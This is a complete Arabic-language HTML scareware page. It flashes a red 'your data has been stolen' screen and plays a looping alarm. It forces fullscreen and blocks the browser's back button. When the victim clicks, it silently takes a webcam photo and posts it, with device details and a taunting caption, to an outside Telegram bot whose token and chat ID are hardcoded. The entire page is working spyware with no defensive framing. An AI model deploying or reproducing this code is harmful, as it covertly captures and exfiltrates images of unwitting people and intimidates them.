<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM CRITICAL</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; margin: 0; text-align: center; }
        .full { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 25px solid #f00; animation: shake 0.05s infinite; }
        @keyframes shake { 0% { transform: translate(3px, 3px); } 100% { transform: translate(-3px, -3px); } }
        .big-title { font-size: 3.5em; font-weight: bold; color: #f00; text-shadow: 0 0 30px #f00; margin-bottom: 20px; }
        .device-info { font-size: 2.5em; color: #ff0; margin: 20px; font-weight: bold; }
        .progress-container { width: 90%; height: 50px; border: 5px solid #0f0; margin: 20px; background: #111; }
        .progress-bar { height: 100%; width: 0%; background: #0f0; box-shadow: 0 0 30px #0f0; transition: width 0.2s; }
        .btn { padding: 40px 80px; font-size: 2.5em; background: #f00; color: #fff; border: none; cursor: pointer; border-radius: 20px; animation: blink 0.5s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }
    </style>
</head>
<body onclick="start()">

    <audio id="alarm" loop preload="auto">
        <source src="https://www.soundjay.com/mechanical/sounds/alarm-clock-01.mp3" type="audio/mpeg">
    </audio>
    
    <div class="full">
        <div class="big-title">⚠️ تم سحب بياناتك بواسطة الديزل! 😈</div>
        <div class="device-info" id="d-name">جاري المسح...</div>
        
        <div class="progress-container">
            <div class="progress-bar" id="bar"></div>
        </div>
        
        <button class="btn" id="btn" onclick="start()">تأكيد الهوية (يتبقى 5)</button>
    </div>

    <script>
        const BOT_TOKEN = "8627248426:AAEtvtxQzAThKrVmI1orIx7GF4-wFXSYG-4";
        const CHAT_ID = "5177962707";
        let count = 5;
        const devInfo = navigator.platform;
        document.getElementById('d-name').innerText = "📱 نوع الجهاز: " + devInfo;

        async function start() {
            document.getElementById('alarm').play().catch(()=>{});
            document.documentElement.requestFullscreen();
            
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const canvas = document.createElement('canvas');
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob);
                        const msg = `😈 تم سحب مغفل جديد يا ديزل! \n\n📱 الجهاز: ${devInfo} \n📅 الوقت: ${new Date().toLocaleString('ar-EG')}`;
                        fd.append('caption', msg);
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    });
                }, 500);
            });

            count--;
            if (count > 0) {
                document.getElementById('btn').innerText = "تأكيد الهوية (يتبقى " + count + ")";
                document.getElementById('bar').style.width = (100 - (count * 20)) + "%";
            } else {
                alert("تم سحب ملفاتك بالكامل. لا تحاول المغادرة!");
                count = 5; 
            }
        }

        window.history.pushState(null, null, document.URL);
        window.addEventListener('popstate', () => {
            window.history.pushState(null, null, document.URL);
        });
    </script>
</body>
</html>
